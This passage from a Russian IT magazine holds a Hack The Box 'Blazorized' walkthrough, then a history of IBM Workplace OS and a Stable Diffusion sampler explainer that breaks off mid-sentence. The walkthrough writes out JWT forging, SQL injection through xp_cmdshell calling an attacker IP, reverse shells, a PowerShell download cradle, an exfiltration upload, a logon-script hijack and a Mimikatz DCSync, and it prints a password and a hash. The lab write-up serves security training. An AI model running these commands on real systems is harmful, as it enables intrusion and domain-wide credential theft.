проэксплуатируем   цепочку  разрешений
на  атрибуты SPN  и  ScriptPath  учетных
записей пользователей для продвижения
к администратору домена и компрометации
всего домена.


Наша цель — получение прав суперпользователя на машине Blazorized
с учебной площадки Hack The Box. Уровень сложности задания — средний.


           WARNING

                            Подключаться к машинам с HTB рекомендуется
                        с применением средств анонимизации и вир‐
                          туализации. Не делай этого с компьютеров, где
                         есть важные для тебя данные, так как ты ока‐
                        жешься в общей сети с другими участниками.



РАЗВЕДКА

Сканирование портов
Добавляем IP-адрес машины в /etc/hosts:


10.10.11.22    blazorized.htb

И запускаем сканирование портов.


Справка: сканирование портов
Сканирование портов — стандартный первый шаг при любой атаке. Он поз‐
воляет атакующему узнать, какие службы на хосте принимают соединение.
На основе этой информации выбирается следующий шаг к получению точки
входа.
   Наиболее известный инструмент для сканирования — это Nmap. Улучшить
результаты его работы ты можешь при помощи следующего скрипта:


 #!/bin/bash
 ports=$(nmap -p- --min-rate= 500 $1 | grep ^[0-9] | cut -d '/' -f 1 |
 tr '\n' ',' | sed s/,$//)
 nmap -p$ports -A $1


Он действует в два этапа. На первом производится обычное быстрое ска‐
нирование, на втором — более тщательное сканирование, с использованием
имеющихся скриптов (опция -A).





                             Результат работы скрипта

Скрипт нашел много открытых портов:
 • 80 (HTTP) — веб‑сервер Microsoft IIS/10.0;
 • 88 — Kerberos;
 • 135 — Microsoft RPC;
 • 139 — NetBIOS, NetLogon;
 • 389 — LDAP;
 • 445 — SMB;
 • 464 — служба смены пароля Kerberos;
 • 593 (HTTP-RPC-EPMAP) — используется в службах DCOM и MS Exchange;
 • 636 — LDAP с шифрованием SSL или TLS;
 • 1433 — MS SQL Server 2022;
 • 3268 (LDAP) — для доступа к Global Catalog от клиента к контроллеру;
 • 3269 (LDAPS) — для доступа к Global Catalog от клиента к контроллеру
   через защищенное соединение;
 • 5985 — WinRM;
 • 9389 — веб‑службы AD DS.

Без учетных данных ничего, кроме сайта, не доступно.





                           Главная страница сайта

Хоть мы и загрузили всего одну страницу, в Burp History можно увидеть заг‐
рузку множества DLL-библиотек.





                             Burp History

Это очень характерно для веб‑платформы Blazor.


ТОЧКА ВХОДА

Пройдемся по страницам на сайте, а затем снова проверим Burp History.





                             Burp History

Находим еще один домен api.blazorized.htb и добавляем его в hosts.


10.10.11.22 blazorized.htb api.blazorized.htb

Так как есть один поддомен, могут быть и другие, поэтому их нужно прос‐
канировать. Для этого применим утилиту ffuf.


Справка: сканирование веба c ffuf
Одно из первых действий при тестировании безопасности веб‑приложе‐
ния — это сканирование методом перебора каталогов, чтобы найти скрытую
информацию и недоступные обычным посетителям функции. Для этого можно
использовать программы вроде dirsearch и DIRB.
  Я предпочитаю легкий и очень быстрый ffuf. При запуске указываем сле‐
дующие параметры:
 • -w — словарь (я использую словари из набора SecLists);
 • -t — количество потоков;
 • -u — URL;
 • -H — HTTP-заголовок;
 • -mc — HTTP-код ответа.

Место перебора помечается словом FUZZ.



Задаем все нужные параметры и запускаем:


ffuf -u http://blazorized.htb -H 'Host: FUZZ.blazorized.htb' -w
subdomains-bitquark-top100000.txt -t 128 -mc 200



                       Результат сканирования поддоменов

Мы нашли еще один домен — admin.blazorized.htb, добавляем его
в hosts.


10.10.11.22 blazorized.htb api.blazorized.htb admin.blazorized.htb

На найденном поддомене нас встретит только форма авторизации.





                          Страница авторизации

Blazor позволяет узнать, какие на сервере используются библиотеки и рас‐
ширения. Для этого достаточно запросить файл /_framework/blazor.boot.
json. У нас он уже есть в Burp History.





                    Содержимое файла blazor.boot.json

Когда приложение Blazor WebAssembly запускается, оно сначала получает все
DLL-приложения. Поэтому, если DLL используется только на каких‑то опре‐
деленных страницах, ее можно поместить в отложенную загрузку до тех пор,
пока она не потребуется. Это помогает ускорить работу веб‑приложения.





            Содержимое файла blazor.boot.json (продолжение)

Отметим библиотеку Blazored.Helpers.dll в lazyAssembly (сборка отло‐
женной загрузки) и скачаем ее для статического анализа. Так как библиотека
написана на .NET, ее можно декомпилировать с помощью ILSpy. Среди всех
декомпилированных классов нас интересует JWT.





                       Декомпилированный класс JWT


Справка: JSON Web Token (JWT)
JSON Web Token состоит из трех частей: заголовка (header), полезной наг‐
рузки (payload) и подписи. Заголовок и полезная нагрузка представляют
собой объекты JSON, при этом нагрузка может быть любой, это именно те
критически важные данные, которые передаются приложению. Заголовок
содержит определенные поля:
 • alg — алгоритм, используемый для подписи/шифрования. Это обязатель‐
  ный ключ;
 • typ — тип токена. Это поле должно иметь значение JWT.

Третий элемент вычисляется на основании первых двух и зависит от выб‐
ранного алгоритма. Токены могут быть перекодированы в компактное пред‐
ставление: к заголовку и полезной нагрузке применяется алгоритм Base64-
URL, после чего добавляется подпись и все три элемента разделяются точ‐
ками.
  Для анализа токенов можно использовать приложение jwt_tool или сайт
jwt.io.



Этот класс раскрывает нам структуру JWT, роли, секреты и даже имя админис‐
тратора.  Единственное,  что нам  нужно  сгенерировать  самостоятельно
для подделки токена, — это срок действия билета (exp). Для этого переведем
какую‑нибудь дату из будущего в формат Unix.





                            Получение значения exp

Затем пройдем на jwt.io, соберем токен JWT и укажем секрет для подписи.





                         Создание JWT-токена

В локальном хранилище браузера откроем данные сайта admin.blazorized.
htb и создадим запись с JWT-токеном. После обновления страницы получа‐
ем доступ к панели администратора.





                       Панель администратора сайта




                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
     HTB BLAZORIZED
              ЛОМАЕМ САЙТ НА ВЕБ-
                 ПЛАТФОРМЕ BLAZOR





ТОЧКА ОПОРЫ

Проверяем сайт и находим функцию проверки заголовков постов на наличие
дубликатов.





                        Проверка дубликатов заголовка

Так как на сервере работает СУБД MS SQL, возможно, приложение исполь‐
зует базу данных. Проверим, нет ли возможности для SQL-инъекции простой
нагрузкой: ' or 1=1 -- -. Сервер вернул число 13, а не 0, как в прошлый
раз, поэтому SQL-инъекция возможна.





                    Результат проверки наличия SQL-инъекции

Сразу попробуем выполнить команду через процедуру xp_cmdshell. На сво‐
ем хосте запустим веб‑сервер:


python3 -m http.server 8000

А на сайте отправим нагрузку для выполнения запроса через curl.


asd'; exec master.dbo.xp_cmdshell 'curl http://10.10.16.53:8000/test_
rce' -- -





                               Логи веб‑сервера

Запрос пришел на веб‑сервер, а значит, мы можем запустить листенер:


rlwrap nc -nlvp 4321

И теперь  выполняем реверс‑шелл,  сгенерированный на  сайте Online
Reverse Shell Generator.





                      Сессия пользователя NU_1055

У полученного пользователя забираем первый флаг.





                       Флаг пользователя


ПРОДВИЖЕНИЕ

Пользователь SSA_6010
Теперь, когда у нас есть сессия доменного пользователя, мы можем собрать
и проанализировать данные с помощью BloodHound.


Справка: BloodHound
Утилита BloodHound использует теорию графов для выявления скрытых
и зачастую непреднамеренных взаимосвязей в среде Active Directory. Ее мож‐
но использовать, чтобы легко идентифицировать очень сложные пути атаки.
Помимо самой утилиты, которая позволяет просматривать граф, существует
часть, загружаемая на удаленный хост для сбора информации. Она бывает
в версиях для Windows — на PowerShell или C# — и для Linux — на Python.



SharpHound.exe -c All





                    Сбор данных BloodHound

В результате работы утилиты получим архив с данными. Чтобы загрузить его
с удаленного сервера на локальную машину, воспользуемся моим веб‑сер‐
вером с возможностью загрузки файлов на сервер. На локальной машине
запускаем веб‑сервер, а на удаленной выполняем загрузку через PowerShell.


$wc=New-Object System.Net.WebClient; $resp=$wc.UploadFile('http://10.
10.16.53:8000/',"C:\Windows\Tasks\20240830080113_BloodHound.zip")

Теперь можно построить и проанализировать граф от скомпрометированных
пользователей.





                       Граф BloodHound

Видим, что у пользователя NU_1055 есть право записи в атрибут SPN учетки
RSA_4810. После записи SPN можно будет провести атаку Kerberoasting, что
позволит подобрать пароль целевой  учетной записи. Для  этого будем
использовать скрипт PowerView, загружаемый с нашего локального веб‑сер‐
вера.


IEX(New-Object Net.WebClient).downloadString('http://10.10.16.53:
8000/PowerView4.ps1')
Set-DomainObject -Identity RSA_4810 -SET @{serviceprincipalname='qwe/
ralf'}
Get-DomainSPNTicket -SPN qwe/ralf





                            Получение хеша пароля

Этот хеш очень быстро перебирается с помощью hashcat.





                            Подбор пароля

Новый пользователь может получить сессию через службу WinRM.


evil-winrm -u 'RSA_4810' -p '(Ni7856Do9854Ki05Ng0005 #)' -i 10.10.11.
22





                  Информация о пользователе RSA_4810


Пользователь RSA_4810
В окружении пользователя ничего интересного найти не удалось, BloodHound
никаких связей не показал. Копнем чуть глубже в ACL и проверим права
записи в атрибуты других объектов домена с помощью bloodyAD.


bloodyAD --host 10.10.11.22 -u 'RSA_4810' -p '(
Ni7856Do9854Ki05Ng0005 #)' -d blazorized.htb get writable





                      Права записи на объекты домена

Таким образом, учетная запись RSA_4810 имеет право записи в какие‑то
атрибуты учетной записи SSA_6010. Узнаем, какие именно атрибуты можно
переписать.


bloodyAD --host 10.10.11.22 -u 'RSA_4810' -p '(
Ni7856Do9854Ki05Ng0005 #)' -d blazorized.htb get writable --detail



                     Права записи на объект SSA_6010

Скрипт, указанный в атрибуте ScriptPath, будет выполняться при логоне
пользователя. Просмотрим права на скрипты.


icacls C:\windows\SYSVOL\sysvol\blazorized.htb\scripts\*





                              Права на файлы

Находим объект A32FF3AEAA23, который можно перезаписать. Перезаписы‐
ваем скрипт на реверс‑шелл, открываем листенер (nc -nlvp 5432), а затем
указываем этот скрипт в атрибуте учетной записи SSA_6010.


echo "powershell -e JABjA.....AA==" | Out-File -FilePath C:\windows\
SYSVOL\sysvol\blazorized.htb\scripts\A32FF3AEAA23\script.bat
-Encoding ASCII


Set-ADUser -Identity SSA_6010 -ScriptPath C:\windows\SYSVOL\sysvol\
blazorized.htb\scripts\A32FF3AEAA23\script.bat

Спустя какое‑то время получаем сессию в окне листенера.





                      Сессия пользователя SSA_6010


ЛОКАЛЬНОЕ ПОВЫШЕНИЕ ПРИВИЛЕГИЙ

Судя по данным BloodHound, пользователь SSA_6010 имеет право реп‐
ликации учетных данных домена.





                       Граф BloodHound

Все учетные записи домена нам не нужны, хватит только администратора.
Запросить хеш его пароля можно с помощью Mimikatz.


.\mimikatz.exe "lsadump::dcsync /user:administrator" "exit"





                      Получение учетных данных админа

С хешем админа авторизуемся через WinRM и читаем последний флаг.


evil-winrm -u administrator -H f55ed1465179ba374ec1cad05b34a5f3 -i
10.10.11.22





                           Флаг рута

Машина захвачена!
GEEK





Альтернативная история — один из самых
популярных литературных жанров. Многим
интересно узнать, в какую сторону свер‐
нула бы  цивилизация, если бы Колумб
не  открыл  Америку  или  IBM  приняла       Валентин Холмогоров                                                                               Ведущий редактор
на вооружение вместо чипов Intel процес‐         valentin@holmogorov.ru
соры PowerPC… Впрочем, последнее —
совсем не фантастика, а реальный исто‐
рический факт. Ведь для «IBM PowerPC»
даже разрабатывалась специальная опе‐
рационная система!


             INFO

                           Читай также: «Полуось. Как OS/2 изменила судьбу
                           Microsoft и открыла дорогу для Windows».



С ЧЕГО ВСЕ НАЧАЛОСЬ?

Середина девяностых стала для корпорации IBM не лучшим периодом в ее
истории. С одной стороны, созданный этой компанией стандарт персональ‐
ных компьютеров IBM PC завоевал значительную долю рынка во всем мире,
с другой — независимые производители клепали IBM-совместимые пер‐
соналки и комплектующие для них миллионными тиражами, лишая прибыли
самого автора технологии. Ко всему прочему специально разработанная
для этих машин операционная система OS/2 стремительно теряла популяр‐
ность под натиском Microsoft Windows, превратившейся в самую распростра‐
ненную ОС на нашей планете. Впору задуматься над своим будущим.
  И в IBM задумались. Выход из сложившегося технологического и финан‐
сового тупика там увидели в смене аппаратной платформы: если вместо про‐
цессоров Intel персоналки IBM PC будут использовать микросхемы PowerPC,
это позволит компании, во‑первых, сосредоточить в своих руках производс‐
тво железа, а во‑вторых, выпустить под эту технологическую платформу собс‐
твенную операционку, что, в свою очередь, позволит писать и продавать софт
для нее.
   Корпорация IBM вместе с Motorola и Apple уже давно принимала непос‐
редственное участие в разработке RISC-архитектуры PowerPC, потому эти
процессоры были для нее, что называется, «родными». К 1994 году компания
Apple планировала полностью отказаться от процессоров Motorola серии 68k
в пользу PowerPC, что служило наглядным примером, доказывающим прин‐
ципиальную возможность такой радикальной смены архитектуры. К слову,
значительно позже Apple проделала подобный фокус еще дважды: в 2006-м,
мигрировав с PPC на платформу Intel, и в 2020-м, перейдя с Intel на чипы
Apple  Silicon. Что же  касается операционной  системы, которую можно
было бы использовать на новых компьютерах IBM, то работа над ней
началась еще в 1991 году. В общем, казалось, что для реализации этого
амбициозного проекта звезды складывались самым благоприятным образом.


КОНЦЕПЦИЯ ОПЕРАЦИОННОЙ СИСТЕМЫ

В 1990-м, когда IBM и Microsoft окончательно прекратили сотрудничество
по разработке OS/2, архитекторы первой из этих двух компаний пришли
к выводу, что эволюция операционных систем движется куда‑то не туда. Унас‐
ледованная еще из шестидесятых парадигма процедурного программирова‐
ния делала разработку ОС чрезвычайно трудоемким и ресурсозатратным
процессом. Программисты тратили массу времени не только на написание
кода: команды разработчиков, поглощенные исправлением ошибок и внед‐
рением новых функций, не успевали создавать совместимые с этой ОС при‐
ложения. Каждая операционная система существовала в изоляции и не поз‐
воляла использовать приложения из другой экосистемы. Архитекторы IBM
мечтали об «универсальной» платформе, в которой можно было бы запускать
программы, созданные и для DOS/Windows, и для OS/2, и для UNIX.
   Чтобы воплотить эту мечту в реальность, в IBM начали трудиться сразу
в двух  направлениях. Во‑первых, компания решила полностью сломать
общепринятый тогда цикл разработки операционных систем, подразумевав‐
ший выпуск нескольких альфа‑версий, затем бета‑версий, потом релиз‑кан‐
дидата и, наконец, релиза, после чего весь процесс повторялся с новой вер‐
сией ОС. Вместо этого они решили распараллелить разработку и тестирова‐
ние: в этом случае тестировщики работали с отдельными модулями ОС, в то
время  как  программисты  занимались  написанием  новых  компонентов
и исправлением багов в существующих. Этот принцип получил название
Grand Unified Theory of Systems (GUTS), или «большая единая теория систем».
Во‑вторых, в IBM начали создавать микроядро для принципиально новой
операционной системы, отличной от OS/2. Идея была грандиозной: в IBM
нацелились, ни много ни мало, создать единую унифицированную архитек‐
туру для множества существующих и будущих операционных систем мира.
   Это микроядро, получившее название IBM Microkernel, было задумано
как масштабируемое, кросс‑платформенное и модульное, с поддержкой кли‐
ент‑серверной  архитектуры,  при  этом  лицензировать  предполагалось
не только бинарные файлы, но и исходный код. В IBM надеялись добиться
универсальности, благодаря которой это микроядро можно было бы исполь‐
зовать как на настольных компьютерах, так и в мейнфреймах, примерно
как сейчас ядро Linux лежит в основе ОС и на мобильных Android-устрой‐
ствах, и на персоналках, и на серверах. За основу в IBM взяли модифициро‐
ванный Open Software Foundation форк микроядра Mach 3.0, созданного сот‐
рудниками университета Карнеги — Меллона Ричардом Рашидом и Эви
Теваньяном. Выбор был продуманным: это же микроядро позже стало осно‐
вой для разработанного Apple ядра XNU, которое используется в macOS, iOS,
iPadOS, tvOS и watchOS.
   Планы IBM были амбициозными. Работающая на основе IBM Microkernel
операционная  система  должна была широко  использовать  библиотеки
и фреймворки для упрощения создания прикладных программ, обеспечивать
полную обратную совместимость с устаревшими и наследуемыми системами
и при этом поддерживать как 32-битный, так и 64-битный режимы работы,
причем параллельно. Кроме того, новое микроядро должно было работать
на нескольких аппаратных архитектурах: PowerPC, ARM и x86, но от этих гран‐
диозных планов в итоге пришлось отказаться, и полномасштабная поддержка
была реализована только для PPC.
   Поверх микроядра располагался слой общедоступных служб (Personality
Neutral Services, PNS), обеспечивающий взаимодействие ядра и прикладных
процессов в операционной системе. Ведущий архитектор IBM Пол Джи‐
ангарра, занимавшийся проектированием этой ОС, писал, что слой PNS
по задумке разработчиков включал не только низкоуровневые службы фай‐
ловой системы, ввода‑вывода и драйверов устройств, но и высокоуровневые
службы, обеспечивающие работу сетевого стека и баз данных. Считалось,
что размещение таких ориентированных на приложения служб близко к мик‐
роядру повысит их эффективность за счет сокращения количества вызовов
функций.
  В IBM  придумали и собственную модель драйверов под  названием
Adaptive Driver Architecture (ADD) — предполагалось, что она облегчит пор‐
тирование драйверов между разными ОС, использующими IBM Microkernel.
По задумке разработчиков такие драйверы должны были стать частью инстру‐
ментария,  обеспечивающего  переносимость ОС:  например,  некоторые
из них могли использоваться с целью поддержки оборудования, необходимо‐
го для нормальной работы приложений Windows и OS/2 на микроядре IBM
Microkernel.
   Поверх слоя служб располагалась еще одна абстракция — так называ‐
емый слой персоналий (personalities). Под «персоналиями» в IBM понимали
подсистемы среды и окружения для приложений, изначально разработанных
для разных системных платформ. Под управлением микроядра IBM планиро‐
валось обеспечить работу программ для DOS, Windows, OS/2 и UNIX (AIX),
позже рассчитывали добавить поддержку macOS. При этом пользователь мог
настроить ОС таким образом, чтобы какие‑то персоналии оставались пре‐
валирующими: например, отключить поддержку Windows или UNIX, если она
ему не нужна.
  А вот что касается графического интерфейса, то в этом вопросе единоду‐
шия не было. Разные группы разработчиков отстаивали свой вариант: одни
планировали встроить в новую ОС уже готовый оконный менеджер Workplace
Shell из OS/2 той же IBM, другие настаивали на использовании Common
Desktop Environment (CDE) от UNIX.


АЛЬЯНС С APPLE И РОЖДЕНИЕ WORKPLACE OS

Вдрызг разругавшись с Microsoft, корпорация IBM сразу же начала заиг‐
рывать с их прямым конкурентом — компанией Apple. В 1991 году делегация
специалистов из IBM побывала в гостях у генерального директора «яблочни‐
ков» Джона Скалли, где им продемонстрировали прототип операционной
системы с кодовым названием Pink, внутреннее устройство которой в целом
соответствовало идеологии GUTS, как минимум в силу широкого исполь‐
зования программных фреймворков на микроядре. Нашлись у IBM с Apple
и  другие  точки  соприкосновения:  совместная работа над  архитектурой
PowerPC. Эти процессоры вскоре должны были стать основой всех компь‐
ютеров, выпускаемых Apple.
   Результатом переговоров стало соглашение о сотрудничестве, которое
Джон Скалли охарактеризовал так: «Благодаря историческому партнерству
Apple и IBM OS/2 и macOS, уже находящиеся в массовом доступе, будут объ‐
единены на общей аппаратной платформе PowerPC, что принесет возрожде‐
ние отрасли». Иными словами, в IBM уже тогда планировали наладить выпуск
персоналок на платформе PowerPC, не хватало только операционной сис‐
темы. Для ее разработки в 1992 году IBM и Apple основали компанию Taligent
Inc, которая занялась дальнейшим  развитием  проекта  Pink. Новую ОС
решили собрать на уже созданном микроядре IBM Microkernel — проект
получил наименование Workplace OS. Впрочем, для IBM главным мотивом
всей этой истории оставалось не «возрождение отрасли», которую дек‐
ларировал Скалли, а попытка пошатнуть рыночные позиции Wintel — так
в айтишных кругах того времени называли победоносный тандем Windows
и Intel.





Впервые прототип новой ОС показали публике на выставке Comdex в кон‐
це 1992 года. Прототип позволял запускать программы для MS-DOS и OS/2,
а разработчики с гордостью заявляли, что на подходе «персоналия», которая
обеспечит совместимость Workplace OS с приложениями macOS.
  К 1993 году Taligent и IBM начали тестирование двух версий Workplace
OS — с интерфейсом Workplace Shell, позаимствованным из OS/2, и оконным
менеджером на основе UNIX Common Desktop Environment. Остановились
в итоге на первом варианте. Можно сказать, что к началу 1994 года работос‐
пособная бета Workplace OS была уже готова, а вот железа под нее все
еще не было.





Подразделение IBM, занимавшееся персональными компьютерами, — IBM
Power Personal Systems — к 1994 году сумело построить только несколько
прототипов персоналок на основе процессора PowerPC и неторопливо прис‐
тупило к их тестированию. Ничего не поменялось и в 1995 году. Ничего, кро‐
ме появления двумя годами ранее Windows NT 3.1 — системы, которая
встряхнула корпоративный IT-рынок и перевернула его с ног на голову.
В Microsoft сознательно отказались от расширенной кросс‑платформенности
в пользу надежности и простоты архитектуры: в то время как разработчики
Workplace OS самоотверженно боролись с различными сбоями и аппарат‐
ными проблемами, Windows NT просто работала.
  Уже на этапе тестирования Workplace OS совершенно внезапно обна‐
ружился неустранимый баг, связанный с конфликтом в порядке байтов.
Порядок байтов — это очередность, в которой байты в слове данных записы‐
ваются в память и читаются из нее. Иными словами, это способ, с исполь‐
зованием которого компьютер хранит и обрабатывает значения, занимающие
больше одного байта, — например, целые числа и числа с плавающей точкой.
Workplace OS,  изначально  ориентированная на совместимость с OS/2,
по умолчанию использовала little-endian, в то время как AIX и некоторые дру‐
гие ОС — big-endian. Процессор PowerPC мог работать в любом из этих
режимов, но порядок байтов выбирался один раз при загрузке системы
и потом уже не мог быть изменен. Это ставило жирный крест на заявленной
IBM одновременной поддержке Workplace OS целой кучи разных систем
с помощью «персоналий» — по факту операционка могла запускать приложе‐
ния только тех платформ, в которых совпадал порядок байтов.
   Выпуск релиза Workplace OS непрерывно переносился и откладывался,
и в руководстве IBM отчаялись уже настолько, что начали всерьез рассмат‐
ривать возможность использовать на своих компьютерах с процессорами
PowerPC… Windows NT. Только вот серийное производство самих этих компь‐
ютеров так и не наладили.


КРУШЕНИЕ НАДЕЖД

Первый (и последний) выпуск Workplace OS состоялся 15 декабря 1995 года.
Правда, из‑за полного отсутствия поддержки платформой каких‑либо других
приложений, кроме OS/2, эта операционка в релизе получила название OS/2
Warp Connect (PowerPC Edition). Партнерам IBM ОС стала доступна 5 янва‐
ря 1996 года, но поставляли ее только клиентам, использовавшим серверное
оборудование IBM Power Series, по специальному запросу, причем уста‐
новить ее можно было только на устройства двух моделей: IBM PC Power
Series 830 и 850. Стоимость лицензии составила 215 долларов.





Несмотря на собственное микроядро, отличное от ядра «полуоси», эта сис‐
тема была полностью идентична по своему интерфейсу OS/2 для Intel, единс‐
твенное отличие состояло в том, что она могла запускаться на компьютерах
с процессорами PowerPC 604 на частоте 100–120 МГц. А вот с функциями
вышел конфуз: несмотря на то что OS/2 Warp Connect предназначалась
для серверов… она не имела поддержки сети. В IBM объясняли это тем, что
релиз предназначен для разработчиков, но тут вылез наружу конфуз номер
два: в дистрибутиве напрочь отсутствовал компилятор. В ответ на недоумен‐
ные вопросы пользователей представитель подразделения персональных
системных  продуктов IBM Джо Станкард заявил:  «Когда и если рынок
PowerPC  увеличится, мы  увеличим  присутствие  операционной  системы
по мере необходимости». А в опубликованном в интернете коммюнике
добавил: «Мы не планируем дополнительных релизов семейства OS/2 Warp
на платформе PowerPC в 1996 году — поскольку мы только что выпустили
в конце декабря 1995 года продукт OS/2 Warp PowerPC Edition». То есть эта
недоделанная сырая операционка без поддержки сетевого стека считалась
полноценным релизом. А остальное подвезут, если будете покупать то, что
дали.
   Насчет  дальнейших  планов  компании  Станкард не  соврал:  в  мар‐
те 1996 года IBM полностью закрыла проект Workplace OS, посчитав его бес‐
перспективным. Причин было  несколько: невысокая производительность,
отсутствие поддержки других приложений, кроме OS/2, отказ от планов
выпуска персоналок на базе процессоров PPC и низкий спрос со стороны
клиентов. Но главной причиной стала невозможность реализовать запуск
приложений из разных ОС в рамках одной платформы, который IBM изна‐
чально  рассматривала  в  качестве  своей  основной  цели.  Архитектор
Workplace OS Фримен Л. Роусон позже вспоминал об этом так: «Не существу‐
ет хорошего способа обеспечить полноценную поддержку нескольких сис‐
тем, не делая платформу чрезмерно большой и сложной. Кроме того,
передача сообщений микроядра не соответствовала характеристикам сов‐
ременных процессоров, что привело к проблемам с производительностью.
Наконец, использование множества системных объектов усложнило дизайн
и еще больше снизило производительность ОС. [...] Более скромные, более
целевые операционные системы потребляют меньше ресурсов, предлагают
лучшую производительность и могут обеспечить желаемый результат с мень‐
шими компромиссами».
  В 1996 году IBM закрыла и подразделение Power Personal Systems, ответс‐
твенное за разработку персоналок на базе PowerPC. В совокупности кор‐
порация вбухала в этот проект два миллиарда долларов (или 0,6% от дохода
IBM за этот период). Журналисты называют Workplace OS одним из самых
провальных эпизодов в истории IBM, но этот продукт тем не менее осно‐
вывался на вполне здравых идеях, которые позже нашли свое воплощение
в других операционных системах.
GEEK





У веб‑интерфейсов к диффузионным ней‐
ронкам   вроде   Stable   Diffusion   есть
огромная  масса  параметров,  движков
и ползунков, меняя значения которых мож‐
но добиться изменения картинки при про‐          Олег Афонин                                                                                      Эксперт по мобильной
чих равных условиях. Сегодня поговорим       криминалистике компании                                                                                         «Элкомсофт»
о выборе семплеров и шедулеров.                          aoleg@voicecallcentral.com


Принято считать, что если выбор семплера (а тем более — шедулера) и вли‐
яет на  результат  генерации,  то,  во‑первых,  влияние  это  минимально,
а во‑вторых, достаточное количество шагов нивелирует и без того неболь‐
шую разницу между финальными изображениями. Это глубочайшее заб‐
луждение, что я и намерен продемонстрировать в сегодняшней статье.


Читай также по теме генеративных моделей:
 • Stable Diffusion XL. Генерируем картинки нейросетью на своем компьюте‐
   ре
 • Stable Diffusion XL. Выбираем модели, рефайнеры, лоры и стили
 • ReForge. Улучшаем картинки, генерируемые Stable Diffusion
 • FLUX.1 и SwarmUI. Генерируем картинки новой открытой моделью
 • Фишки FLUX.1. Добиваемся лучших картинок от новой генеративной
  модели
 • Карта мира генеративного ИИ. Выбираем модель и интерфейс, разбира‐
   емся с терминами




СЕМПЛЕР И ШЕДУЛЕР: ЧТО ЭТО ТАКОЕ

В контексте генеративного ИИ, особенно при работе с диффузионными
моделями, термины sampler и scheduler играют ключевую роль в процессе
генерации изображений.
   Как создать скульптуру? Взять глыбу мрамора и отсечь все лишнее. Имен‐
но по  этому принципу работают диффузионные модели искусственного
интеллекта, к которым относится и семейство Stable Diffusion. Глыбой мра‐
мора здесь выступает сгенерированный моделью шум, а инструментом,
который отсекает лишнее, — семплер. Таким образом, вместо создания
изображения с нуля картинка постепенно восстанавливается из шума, а сем‐
плер определяет, как именно будет происходить этот процесс.





Семплеры управляют тем, как на каждом шаге генерации выбирается и кор‐
ректируется шумовое распределение. Разные семплеры дают различные
результаты. Грубо говоря, из полена можно вырубить Буратино как стамес‐
кой, так и топором; результат будет отличаться.
   Какие‑то семплеры  оптимизированы на скорость (условный «топор»)
и могут быстрее восстанавливать изображение (быстрее конвергировать) —
как правило, в ущерб качеству картинки или разнообразию результатов. Дру‐
гие могут давать более детализированные («стамеска») или, наоборот, упро‐
щенные изображения. Какие‑то семплеры требуют меньшего числа шагов (но
каждый шаг занимает больше времени), а какие‑то — большего, но изме‐
нения картинки на каждом шаге диффузии будут не столь велики.
  Для некоторых видов семплеров увеличение числа шагов приведет в итоге
к очень похожим результатам, для других результат будет разительно отли‐
чаться. Именно по этой причине рекомендации вроде «используйте 20–
30 шагов» лишены смысла, если не указан семплер, для которого рекомен‐
дуется это число шагов.
   Семплеры  бывают  сходящиеся   (конвергентные)  и  несходящиеся.
При  использовании  сходящегося  семплера  картинки,  сгенерированные
с определенным числом шагов, перестают отличаться от изображений, сге‐
нерированных с теми же настройками, но большим числом шагов. Нес‐
ходящиеся семплеры будут продолжать выдавать вариации изображений
при использовании сколь угодно большого числа шагов. Свои особенности
применения есть у обоих типов семплеров.
 • Сходящиеся (конвергентные) семплеры: Euler, LMS, Heun, DPM2, DPM++
   2M.
 • Несходящиеся семплеры: Euler a, DPM2 a и прочие семплеры класса
   ancestral («a» в конце названия), DPM Fast, DDIM, PLMS, DPM adaptive,
   Restart, а также все семплеры, в названии которых присутствует SDE (нап‐
   ример, DPM++ SDE, DPM++ 2M SDE, DPM++ 3M SDE).

Шедулер (scheduler) — это механизм, ответственный за динамическое изме‐
нение ряда параметров на каждом шаге генерации. Он определяет, как на
каждом шаге изменяются такие параметры, как уровень шума или шаг обу‐
чения. В каком‑то смысле можно сказать, что шедулер задает ритм генера‐
ции (грубо говоря, «сперва работаем топором, потом берем стамеску, пос‐
тепенно уменьшая ее размер»), но это было бы сильным упрощением.





Теперь перейдем к конкретным типам семплеров.



Все  иллюстрации  сгенерированы  моделью  tangbohuKalosXl_vx  в  раз‐
решении 1024 на 1024 с последующим удвоением разрешения в Hires Fix.
Использовался фиксированный сид 4001446319, CFG = 7. Текстовый запрос:

         simple watercolor painting of a child girl wearing a hanfu dress
       playing with a kitten, with pagoda and foggy mountains in distant
      background


Для тестирования семплеров использовался фиксированный шедулер Align
Your Steps (AYS). Тестирование различных шедулеров проводилось с фик‐
сированным семплером Эйлера. Целью тестирования была демонстрация
того, как выбранный семплер и шедулер может влиять не только на ком‐
позицию, но и на стиль изображения.





                                     Продолжение статьи →
GEEK                ← НАЧАЛО СТАТЬИ

        СЕМПЛЕРЫ
       И ШЕДУЛЕРЫ
              РАЗБИРАЕМ ДВА ВАЖНЫХ
              МЕХАНИЗМА УЛУЧШЕНИЯ
              ГЕНЕРАТИВНЫХ КАРТИНОК





СЕМПЛЕРЫ

Устаревшие семплеры
Семплеры, в названии которых есть DDIM, DDPM и PLMS, появились на ран‐
ней стадии развития генеративных моделей; DDIM и PLMS вошли еще в
репозиторий Latent Diffusion. Пользоваться ими сейчас бессмысленно: так,
для конвергенции с использованием семплера DDIM требуется порядка
тысячи шагов, а у DDPM и PLMS нет каких‑либо зримых преимуществ
перед более простыми (и намного более быстрыми) семплерами из числа
описанных ниже.


             INFO

                            Если ты решишь поэкспериментировать с DDIM,
                         то используй его в связке с семплером под наз‐
                         ванием   ddim_uniform   или  DDIM   (зависит
                         от используемого веб‑интерфейса).


Большая часть современных семплеров (и ряд шедулеров — в частности,
Karras) были описаны в репозитории k-diffusion, опубликованном Катериной
Кроусон (crowsonkb). О них мы поговорим более подробно.


Обычные дифференциальные уравнения: семплеры класса ODE
Здесь все просто: эти семплеры всего лишь решают систему дифферен‐
циальных уравнений. Самый известный из них — семплер, использующий
метод Эйлера (Euler), разработанный в... 1768 году, задолго до возникно‐
вения компьютеров. Если ты интересуешься математикой, то формулы можно
подсмотреть в Википедии.





Метод Эйлера считается простейшим из доступных алгоритмов. Он не самый
быстрый, не самый точный и не самый креативный, но выдает стабильный
результат, и его поддерживает большинство моделей, включая Flux.
  К классу ODE, кроме метода Эйлера, относятся Heun — более точная,
но более медленная версия алгоритма — и LMS (Linear multi-step method),
который также теоретически может выдавать более точный результат.





Обрати внимание, насколько результат работы Heun напоминает результаты
Euler.
  Все  эти  семплеры  относятся  к  сходящимся  (конвергентным);  изоб‐
ражения, сгенерированные с числом шагов, превышающим определенный
